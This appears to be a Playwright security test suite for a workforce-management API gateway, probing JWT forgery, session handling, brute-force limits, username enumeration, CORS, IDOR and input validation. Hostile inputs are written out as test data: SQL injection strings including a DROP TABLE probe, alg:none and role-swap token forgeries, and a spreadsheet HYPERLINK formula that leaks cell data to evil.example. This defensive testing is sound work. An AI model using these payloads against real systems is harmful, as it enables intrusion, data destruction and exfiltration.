/** Security tests against the live gateway: auth/session, tokens, headers, CORS, injection, IDOR, limits, CSV injection. */
import { test, expect } from '@playwright/test';
import { API, ADMIN_USER, ADMIN_PASSWORD, adminToken, call, login, loginReady, record, testData, RUN } from './helpers';

const b64u = (o: unknown) => Buffer.from(JSON.stringify(o)).toString('base64url');
const finding = (id: string, severity: string, title: string, evidence: unknown, pass = false) => record('security', { id, severity, title, evidence, pass });


let agent1: string, agent2: string;
test.beforeAll(async () => {
  agent1 = await loginReady('demo.agent1', 'Demo-Pass-123', testData.agentPassword);
  agent2 = await loginReady('demo.agent2', 'Demo-Pass-123', testData.agentPassword);
});

test('SEC-01 admin account does not use a blocklisted password', async () => {
  // the gateway's own policy (passwordPolicy.ts) lists "admin@123" as too easy to guess
  const s = await login(ADMIN_USER, ADMIN_PASSWORD);
  const weak = /admin@123|admin123|password|welcome/i.test(ADMIN_PASSWORD) || ADMIN_PASSWORD.toLowerCase().includes(ADMIN_USER);
  finding('SEC-01', 'High', 'Administrator signs in with a password on the app\'s own blocklist, and is not forced to change it', { mustChangePassword: s.mustChangePassword, containsUsername: ADMIN_PASSWORD.toLowerCase().includes(ADMIN_USER) }, !weak);
  expect.soft(weak, 'admin password is weak / contains username').toBe(false);
});

test('SEC-02 password policy rejects weak new passwords', async () => {
  const bad = ['short1!', 'password123', 'demo.agent1-xyz9', 'abcdefghij', '11111111aa', testData.agentPassword];
  const res: string[] = [];
  for (const p of bad) { const r = await call(agent1, 'POST', '/auth/change-password', { currentPassword: testData.agentPassword, newPassword: p }); res.push(`${p.replace(testData.agentPassword, '<same>')} -> ${r.status} ${r.body?.error?.message ?? ''}`); expect.soft(r.status, p).toBe(400); }
  finding('SEC-02', 'Info', 'Password policy enforced on change', res, true);
});

test('SEC-03 forged and tampered tokens are rejected', async () => {
  const a = await adminToken();
  const [h, p, s] = a.split('.');
  const payload = JSON.parse(Buffer.from(p, 'base64url').toString());
  const agentPayload = JSON.parse(Buffer.from(agent1.split('.')[1], 'base64url').toString());
  const forged = {
    algNone: `${b64u({ alg: 'none', typ: 'JWT' })}.${b64u({ ...payload, role: 'WFM_ADMIN' })}.`,
    roleSwap: `${agent1.split('.')[0]}.${b64u({ ...agentPayload, role: 'WFM_ADMIN' })}.${agent1.split('.')[2]}`,
    badSig: `${h}.${p}.${s.slice(0, -4)}AAAA`,
    expired: `${h}.${b64u({ ...payload, exp: 1 })}.${s}`,
    garbage: 'not-a-token',
  };
  const out: Record<string, number> = {};
  for (const [k, t] of Object.entries(forged)) { out[k] = (await call(t, 'GET', '/users')).status; expect.soft(out[k], k).toBe(401); }
  finding('SEC-03', 'Info', 'JWT forgery (alg:none, role swap, bad signature, expired) rejected', out, Object.values(out).every((x) => x === 401));
});

test('SEC-04 logout revokes the token server-side', async () => {
  const t = (await login(ADMIN_USER, ADMIN_PASSWORD)).token;
  expect((await call(t, 'GET', '/auth/me')).status).toBe(200);
  expect((await call(t, 'POST', '/auth/logout', {})).status).toBe(200);
  const after = (await call(t, 'GET', '/auth/me')).status;
  finding('SEC-04', 'Info', 'Token revoked after logout', { after }, after === 401);
  expect(after).toBe(401);
});

test('SEC-05 session token accepted in the URL query string', async () => {
  const t = await adminToken();
  const r = await fetch(`${API}/users?token=${encodeURIComponent(t)}`);
  // tokens in URLs end up in proxy/access logs, browser history and Referer headers
  finding('SEC-05', 'Medium', 'Bearer token accepted as ?token= on every REST route (and used for /ws); leaks into logs, history, Referer', { status: r.status }, r.status === 401);
  expect.soft(r.status, 'REST API should not accept ?token=').toBe(401);
});

test('SEC-06 login brute-force is throttled', async () => {
  const user = `qa.nobody.${RUN}`;
  const codes: number[] = [];
  for (let i = 0; i < 12; i++) codes.push((await call(null, 'POST', '/auth/login', { username: user, password: 'wrong-' + i, tenant: 'ORG' })).status);
  const locked = codes.indexOf(429);
  finding('SEC-06', 'Info', 'Login throttled after 10 failures (per IP + username, 15 min)', { codes }, locked === 10);
  expect(locked).toBe(10);
});

test('SEC-07 username enumeration via response timing', async () => {
  const median = (a: number[]) => a.sort((x, y) => x - y)[Math.floor(a.length / 2)];
  const known: number[] = [], unknown: number[] = [];
  for (let i = 0; i < 5; i++) {
    known.push((await call(null, 'POST', '/auth/login', { username: 'qa.analyst', password: 'wrong-pass-' + i, tenant: 'ORG' })).ms);
    unknown.push((await call(null, 'POST', '/auth/login', { username: `qa.ghost${i}.${RUN}`, password: 'wrong-pass-' + i, tenant: 'ORG' })).ms);
  }
  await call(null, 'POST', '/auth/login', { username: 'qa.analyst', password: testData.rolePassword, tenant: 'ORG' });   // a success resets the lockout counter
  const k = median(known), u = median(unknown);
  const leaks = k - u > 60;
  finding('SEC-07', 'Medium', 'Login response time reveals whether a username exists (bcrypt only runs for real users)', { knownMedianMs: Math.round(k), unknownMedianMs: Math.round(u) }, !leaks);
  expect.soft(leaks, `known ${k.toFixed(0)}ms vs unknown ${u.toFixed(0)}ms`).toBe(false);
});

test('SEC-08 organisation discovery reveals which emails have accounts', async () => {
  const a = await adminToken();
  const emp = ((await call(a, 'GET', '/workforce/employees')).body as any[]).find((e) => e.email);
  const users = (await call(a, 'GET', '/users')).body as any[];
  const withEmail = users.find((u) => u.email) ?? { email: emp?.email };
  const hit = await call(null, 'POST', '/auth/discover', { identifier: withEmail.email ?? 'admin' });
  const miss = await call(null, 'POST', '/auth/discover', { identifier: `nobody.${RUN}@example.com` });
  const opts = await call(null, 'GET', '/auth/login-options');
  finding('SEC-08', 'Low', 'Unauthenticated /auth/discover and /auth/login-options reveal account existence and organisation name', { discoverHit: hit.body, discoverMiss: miss.body, loginOptions: opts.body }, hit.status === 404);
});

test('SEC-09 security headers on the gateway', async () => {
  const r = await fetch(API.replace('/api/v1', '/health'));
  const h = Object.fromEntries(['content-security-policy', 'strict-transport-security', 'x-frame-options', 'x-content-type-options', 'referrer-policy', 'x-powered-by', 'cross-origin-opener-policy'].map((k) => [k, r.headers.get(k)]));
  finding('SEC-09', 'Info', 'Gateway security headers (helmet)', h, !!h['x-content-type-options'] && !h['x-powered-by']);
  expect.soft(h['x-powered-by']).toBeNull();
  expect.soft(h['x-content-type-options']).toBe('nosniff');
});

test('SEC-10 CORS does not allow arbitrary origins', async () => {
  const evil = await fetch(`${API}/auth/login`, { method: 'OPTIONS', headers: { Origin: 'https://evil.example', 'Access-Control-Request-Method': 'POST' } });
  const portal = await fetch(`${API}/auth/login`, { method: 'OPTIONS', headers: { Origin: 'http://localhost:3001', 'Access-Control-Request-Method': 'POST' } });
  const ev = { evilACAO: evil.headers.get('access-control-allow-origin'), portalACAO: portal.headers.get('access-control-allow-origin') };
  finding('SEC-10', 'Info', 'CORS allow-list (only the admin origin; the portal goes through its Vite proxy)', ev, ev.evilACAO !== 'https://evil.example' && ev.evilACAO !== '*');
  expect(ev.evilACAO === '*' || ev.evilACAO === 'https://evil.example').toBe(false);
});

test('SEC-11 SQL injection probes do not error or bypass', async () => {
  const a = await adminToken();
  const payloads = ["' OR '1'='1", "'; DROP TABLE users;--", '1) OR (1=1', '\\', "admin'--"];
  const out: string[] = [];
  for (const p of payloads) {
    const l = await call(null, 'POST', '/auth/login', { username: p, password: p, tenant: 'ORG' });
    out.push(`login ${p} -> ${l.status}`); expect.soft(l.status, 'login ' + p).not.toBe(200); expect.soft(l.status).toBeLessThan(500);
    for (const path of [`/workforce/employees?q=${encodeURIComponent(p)}`, `/audit?search=${encodeURIComponent(p)}`, `/auth/org/${encodeURIComponent(p)}`, `/scheduling/versions/${encodeURIComponent(p)}`]) {
      const r = await call(a, 'GET', path); out.push(`${path.slice(0, 40)} -> ${r.status}`); expect.soft(r.status, path).toBeLessThan(500);
    }
  }
  finding('SEC-11', 'Info', 'SQL injection probes (login, search, ids) handled without 5xx', out, true);
});

test('SEC-12 malformed and oversized bodies are rejected cleanly', async () => {
  const a = await adminToken();
  const bad = await call(a, 'POST', '/config/groups', '{"name":');
  const big = await call(a, 'POST', '/config/groups', JSON.stringify({ name: 'x'.repeat(15 * 1024 * 1024) }));
  const longName = await call(a, 'POST', '/workforce/teams', { name: 'Q'.repeat(5000) });
  const ev = { malformed: bad.status, malformedBody: bad.body?.error?.code, over14mb: big.status, team5000chars: longName.status, team5000msg: longName.body?.error?.message };
  finding('SEC-12', bad.status >= 500 || big.status >= 500 ? 'Medium' : 'Info', 'Malformed JSON / 15MB body / 5000-char name', ev, bad.status === 400 && big.status === 413 && longName.status === 400);
  expect.soft(bad.status).toBe(400);
  expect.soft(big.status).toBe(413);
  expect.soft(longName.status, 'very long team name should be validated').toBe(400);
  if (longName.status === 201) await call(a, 'DELETE', `/workforce/teams/${longName.body.id}`);
});

test('SEC-13 an agent cannot act on another agent\'s requests (IDOR)', async () => {
  const sched = (await call(agent2, 'GET', '/me/schedule')).body;
  const mine = await call(agent2, 'GET', '/me/swaps');
  const other = await call(agent1, 'GET', '/me/swaps');
  const out: Record<string, unknown> = { agent2Schedule: Array.isArray(sched) ? sched.length : typeof sched, agent2Swaps: mine.status };
  // a time-off request by agent2, then agent1 tries to cancel it
  const day = new Date(Date.now() + 20 * 864e5).toISOString().slice(0, 10);
  const to = await call(agent2, 'POST', '/me/time-off', { type: 'PERSONAL', startDate: day, endDate: day, reason: `QA-${RUN} idor` });
  out.createTimeOff = `${to.status} ${to.body?.error?.message ?? ''}`;
  const id = to.body?.request?.id;
  if (id) {
    const r = await call(agent1, 'POST', `/me/time-off/${id}/cancel`, {});
    out['agent1 cancels agent2 request'] = r.status;
    expect.soft([403, 404]).toContain(r.status);
    const list1 = (await call(agent1, 'GET', '/me/time-off')).body;
    out['agent2 request visible to agent1'] = JSON.stringify(list1).includes(id);
    expect.soft(out['agent2 request visible to agent1']).toBe(false);
    out['agent2 cancels own'] = (await call(agent2, 'POST', `/me/time-off/${id}/cancel`, {})).status;
  }
  // swap on someone else's shift
  const shift1 = JSON.stringify((await call(agent1, 'GET', '/me/schedule')).body).match(/"id":"([0-9a-f-]{36})"/)?.[1];
  if (shift1) { const s = await call(agent2, 'POST', '/me/swaps', { kind: 'GIVEAWAY', shiftId: shift1, note: `QA-${RUN}` }); out['agent2 gives away agent1 shift'] = `${s.status} ${s.body?.error?.message ?? ''}`; expect.soft(s.status).toBeGreaterThanOrEqual(400); }
  out.otherSwapsVisible = Array.isArray(other.body) ? other.body.filter((s: any) => s.requesterId && s.requesterId !== (other as any).me).length : other.status;
  finding('SEC-13', 'Info', 'Cross-agent access to time-off/swaps', out, true);
});

test('SEC-14 CSV exports neutralise spreadsheet formulas (CSV injection)', async () => {
  const a = await adminToken();
  const evil = `=HYPERLINK("http://evil.example/?x="&A1,"QA${RUN}")`;
  const t = await call(a, 'POST', '/workforce/teams', { name: evil });
  const csv = await fetch(`${API}/audit/export.csv`, { headers: { Authorization: 'Bearer ' + a } }).then((r) => r.text());
  const line = csv.split('\n').find((l) => l.includes(`QA${RUN}`)) ?? '';
  const raw = /(^|,)"?=HYPERLINK/.test(line);
  finding('SEC-14', 'Medium', 'Audit CSV export writes user-entered names that start with = unescaped (formula injection when opened in Excel)', { teamCreate: t.status, csvLine: line.slice(0, 200) }, !raw);
  expect.soft(raw, 'formula cell in audit export').toBe(false);
  if (t.body?.id) await call(a, 'DELETE', `/workforce/teams/${t.body.id}`);
});

test('SEC-15 time-off input validation (reversed dates, huge range, past dates, extra fields)', async () => {
  const d = (n: number) => new Date(Date.now() + n * 864e5).toISOString().slice(0, 10);
  const cases: Record<string, any> = {
    reversed: { type: 'PERSONAL', startDate: d(30), endDate: d(25) },
    tenYears: { type: 'VACATION', startDate: d(30), endDate: d(30 + 3650) },
    past: { type: 'PERSONAL', startDate: d(-20), endDate: d(-19) },
    badDay: { type: 'PERSONAL', startDate: '2026-02-30', endDate: '2026-02-30' },
    massAssign: { type: 'PERSONAL', startDate: d(40), endDate: d(40), status: 'APPROVED', employeeId: '00000000-0000-4000-8000-000000000000' },
  };
  const out: Record<string, string> = {};
  for (const [k, body] of Object.entries(cases)) {
    const r = await call(agent1, 'POST', '/me/time-off', { ...body, reason: `QA-${RUN} ${k}` });
    out[k] = `${r.status} ${r.body?.request?.status ?? r.body?.error?.message ?? ''}`.slice(0, 160);
    if (r.body?.request?.id) await call(agent1, 'POST', `/me/time-off/${r.body.request.id}/cancel`, {});
  }
  const accepted = ['reversed', 'tenYears', 'past', 'badDay'].filter((k) => out[k].startsWith('201'));
  const crashed = Object.entries(out).filter(([, v]) => v.startsWith('5')).map(([k]) => k);
  finding('SEC-15', accepted.length ? 'High' : crashed.length ? 'Medium' : 'Info', crashed.length ? 'Impossible calendar date (2026-02-30) returns 500 and leaks the raw PostgreSQL error' : 'Self-service time-off date validation', { out, accepted, crashed }, accepted.length === 0 && crashed.length === 0);
  expect.soft(accepted, 'invalid time-off accepted').toEqual([]);
  expect.soft(crashed, 'server error on invalid date').toEqual([]);
  expect.soft(out.massAssign.includes('00000000')).toBe(false);
});

test('SEC-16 stack traces / internals are not leaked in errors', async () => {
  const a = await adminToken();
  const r = await call(a, 'GET', '/scheduling/versions/not-a-uuid/shifts');
  const s = JSON.stringify(r.body);
  const leaks = /at \w+ \(|node_modules|\.ts:\d+|SELECT |postgres|syntax error/i.test(s);
  finding('SEC-16', leaks ? 'Medium' : 'Info', 'Error responses do not leak stack/SQL', { status: r.status, body: s.slice(0, 200) }, !leaks);
  expect.soft(leaks).toBe(false);
  expect.soft(r.status).toBeLessThan(500);
});
